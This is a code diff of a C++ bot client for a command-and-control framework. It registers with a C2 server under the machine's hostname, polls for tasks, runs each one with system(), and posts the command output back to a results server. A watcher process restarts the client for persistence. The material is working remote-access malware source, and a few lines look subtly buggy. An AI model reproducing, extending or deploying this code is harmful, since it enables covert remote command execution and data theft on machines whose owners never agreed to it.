@@ -23,7 +23,10 @@
 #include <windows.h>
 #endif
 
-std::string c2_url = "http://10.13.160.97:5000/bot/register/";
+//std::string c2_url = "http://10.13.160.97:5000/bot/register/";
+std::string c2_register_url = "http://127.0.0.1:5000/bot/register/";
+std::string c2_poll_url = "http://127.0.0.1:5000/bot/poll";
+std::string c2_results_url = "http://127.0.0.1:5001/out";
 
 std::string process_name;
 
@@ -49,125 +52,168 @@ size_t read_callback(void* ptr, size_t size, size_t nmemb, void* userp) {
 
 [[noreturn]]
 void client_work() {
-    auto hostname = get_host_name();
-
-    CURL* curl = curl_easy_init();
-    if (!curl) {
-        std::cerr << "curl_easy_init failed" << std::endl;
-    }
-
-    c2_url += hostname;
-
-    std::string raw_json;
-
-    curl_easy_setopt(curl, CURLOPT_URL, c2_url.c_str());
-    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, nullptr);
-    curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, 0);
-    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &raw_json);
-    curl_easy_setopt(curl, CURLOPT_READFUNCTION, &read_callback);
-    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
-    auto result = curl_easy_perform(curl);
-    curl_easy_cleanup(curl);
-
-    //std::cout << "Data:" << read_data << std::endl;
-
-    if (result != CURLE_OK) {
-        std::cerr << "POST request failed" << std::endl;
-        std::cerr << curl_easy_strerror(result);
-        exit(EXIT_FAILURE);
-    }
-
-    //curl_easy_reset(curl);
-
-    //Issue GET request for uuid;
-    /*
-    curl_easy_setopt(curl, CURLOPT_URL, c2_url.c_str());
-    curl_easy_setopt(curl, CURLOPT_HTTPGET, true);
-    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
-    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &raw_json);
-    */
-
-    rapidjson::Document document;
-    document.Parse(raw_json.c_str());
-    std::string uuid = document["uuid"].GetString();
-
-    std::cout << "UUID: " << uuid << std::endl;
-
-    //Write UUID to config file
-
     std::string config_file_path{};
     if (getenv("HOME") != nullptr) {
         config_file_path += getenv("HOME");
         config_file_path += "/.config/c3.txt";
     }
 
-    FILE* fout = fopen(config_file_path.c_str(), "w+");
-    if (!fout) {
-        std::cerr << "Failed to open file" << std::endl;
-        std::cerr << strerror(errno) << std::endl;
-        errno = 0;
-        exit(EXIT_FAILURE);
+    std::string uuid{};
+
+    //Write UUID to config file
+
+    FILE* uuid_fin = fopen(config_file_path.c_str(), "r");
+    if (uuid_fin) {
+        //Read uuid from config file
+        std::string bytes;
+        fseek(uuid_fin, 0l, SEEK_END);
+        auto file_size = ftell(uuid_fin);
+        rewind(uuid_fin);
+
+        bytes.resize(file_size);
+        fread(bytes.data(), sizeof(char), bytes.size(), uuid_fin);
+        bytes.push_back('\0');
+        uuid = bytes.data();
     }
-    fwrite(uuid.c_str(), sizeof(char), uuid.size(), fout);
-    fflush(fout);
+
+    CURL* curl = curl_easy_init();
+
+    if (uuid.empty()) {
+        //Register client and retrieve uuid
+
+        FILE* fout = fopen(config_file_path.c_str(), "w+");
+        if (!fout) {
+            std::cerr << "Failed to open file" << std::endl;
+            std::cerr << strerror(errno) << std::endl;
+            errno = 0;
+            exit(EXIT_FAILURE);
+        }
+        fwrite(uuid.c_str(), sizeof(char), uuid.size(), fout);
+            fflush(fout);auto hostname = get_host_name();
+
+        curl = curl_easy_init();
+        if (!curl) {
+            std::cerr << "curl_easy_init failed" << std::endl;
+        }
+
+        c2_register_url += hostname;
+
+        std::string raw_json;
+
+        curl_easy_setopt(curl, CURLOPT_URL, c2_register_url.c_str());
+        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, nullptr);
+        curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, 0);
+        curl_easy_setopt(curl, CURLOPT_READFUNCTION, &read_callback);
+        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &raw_json);
+        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
+        auto result = curl_easy_perform(curl);
+
+        if (result != CURLE_OK) {
+            std::cerr << "POST request failed" << std::endl;
+            std::cerr << curl_easy_strerror(result);
+            exit(EXIT_FAILURE);
+        }
+
+        rapidjson::Document document;
+        document.Parse(raw_json.c_str());
+        uuid = document["uuid"].GetString();
+
+    }
+    std::cout << "UUID: " << uuid << std::endl;
+
+    std::string header = std::string("uuid:") + uuid;
+    curl_slist *header_list = nullptr;
+    header_list = curl_slist_append(header_list, header.c_str());
 
     while (true) {
         //Issue get request for work
+        std::string command_json;
 
-        std::string command;
-
-        std::string header{"uuid:"};
-        header += uuid;
-
-        curl_slist* header_list = nullptr;
-        header_list = curl_slist_append(header_list, header.c_str());
-
-        //curl_easy_reset(curl);
-        curl_easy_setopt(curl, CURLOPT_URL, c2_url.c_str());
-        curl_easy_setopt(curl, CURLOPT_HTTPGET, true);
-        //curl_easy_setopt(curl, CURLOPT_HTTPHEADER, header_list);
-        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &command);
+        curl_easy_setopt(curl, CURLOPT_URL, c2_poll_url.c_str());
+        curl_easy_setopt(curl, CURLOPT_HTTPGET, false);
+        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &command_json);
+        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, header_list);
         curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
-        curl_easy_perform(curl);
+        auto result = curl_easy_perform(curl);
+
+        if (result != CURLE_OK) {
+            std::cerr << "GET request failed:" << std::endl;
+            std::cerr << curl_easy_strerror(result);
+            exit(EXIT_FAILURE);
+        }
+
+        std::cout << "Command read:\n" << command_json << std::endl;
+        if (command_json.empty()) {
+            sleep(1000);
+            continue;
+        }
+
+        rapidjson::Document command_document;
+        command_document.Parse(command_json.c_str());
+        std::string command = command_document["task"].GetString();
+
+        std::cout << command << std::endl;
 
         //Pipe output of command to file
         command += " > ./output.txt";
 
         //Execute work
-        system(command.c_str());
+        int status = system(command.c_str());
+        if (status != 0) {
+            std::cerr << "command error code: " << status << std::endl;
+        }
 
         //Read in data from file to temporary buffer
-        std::vector<unsigned char> bytes;
+        std::string bytes;
         FILE* fin = fopen("./output.txt", "r");
         fseek(fin, 0l, SEEK_END);
         auto file_size = ftell(fin);
         rewind(fin);
 
         bytes.resize(file_size);
-        fread(bytes.data(), sizeof(unsigned char), file_size, fin);
+        fread(bytes.data(), sizeof(char), file_size, fin);
+
+        std::cout << "Command output:" << std::endl;
+        std::cout << bytes << std::endl << std::endl;
 
         //Issue post request for results
         curl_easy_reset(curl);
-        curl_easy_setopt(curl, CURLOPT_URL, c2_url.c_str());
+        curl_easy_setopt(curl, CURLOPT_VERBOSE, true);
+        curl_easy_setopt(curl, CURLOPT_URL, c2_results_url.c_str());
         curl_easy_setopt(curl, CURLOPT_POSTFIELDS, bytes.data());
-        curl_easy_setopt(curl, CURLOPT_READFUNCTION, read_callback);
-        curl_easy_perform(curl);
+        curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, bytes.size());
+        curl_easy_setopt(curl, CURLOPT_READFUNCTION, &read_callback);
+        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &bytes);
+        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
+
+        result = curl_easy_perform(curl);
+
+        if (result != CURLE_OK) {
+            std::cerr << "GET request failed:" << std::endl;
+            std::cerr << curl_easy_strerror(result);
+            exit(EXIT_FAILURE);
+        }
+
+        sleep(1000);
     }
 }
 
 #if defined C2ITRUS_LINUX
+
 [[noreturn]]
 void watcher_work() {
+    std::cout << "Watcher started" << std::endl;
+
     while (true) {
         int parent_pid;
         do {
             parent_pid = getppid();
+            std::cout << "Parent PID: " << parent_pid << std::endl;
             sleep(100);
         } while (parent_pid != 1);
+        std::cout << "Parent PID: " << parent_pid << std::endl;
 
-        //TODO: Fix this because it's probably not going to work
-
-        //This process becomes the new worker
+        //This process becomes the new client process and the
         execl(process_name.c_str(), process_name.c_str(), (char*)nullptr);
     }
 }
@@ -217,11 +263,8 @@ void add_watcher() {
     if (pid == 0) {
         watcher_work();
     }
+    std::cout << "Watcher pid:" << pid << std::endl;
     #endif
-}
-
-void term_handler(int signal) {
-    std::cerr << "SIGTERM signal caught" << std::endl;
 }
 
 void spawn_workers(unsigned i) {
@@ -234,22 +277,42 @@ void spawn_workers(unsigned i) {
     }
 }
 
+int sandbox_main(int argc, char* argv[]) {
+    CURL* curl = curl_easy_init();
+    curl_easy_setopt(curl, CURLOPT_URL, c2_register_url.c_str());
+    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, nullptr);
+    curl_easy_setopt(curl, CURLOPT_READFUNCTION, read_callback);
+    curl_easy_perform(curl);
+
+    return EXIT_SUCCESS;
+}
+
+/*
+void exit_callback() {
+    std::cout << "Exited: " << getpid() << std::endl;
+}
+*/
+
 int main(int argc, char* argv[]) {
-    //signal(SIGTERM, term_handler);
+    //return sandbox_main(argc, argv);
+    //signal(SIGTERM, SIG_IGN);
+
+    //atexit(exit_callback);
 
     process_name = argv[0];
 
-    //unsigned num_workers = std::thread::hardware_concurrency();
-    //if (argc > 1) {
-    //    num_workers = std::atoi(argv[1]);
-    //}
-    //spawn_workers(num_workers);
+    /*
+    unsigned num_workers = std::thread::hardware_concurrency();
+    if (argc > 1) {
+        num_workers = std::atoi(argv[1]);
+    }
+    spawn_workers(num_workers);
+    */
 
     //Add watcher
     //add_watcher();
 
     client_work();
 
-    std::cout << "Hello, World!" << std::endl;
-    return 0;
+    return EXIT_SUCCESS;
 }
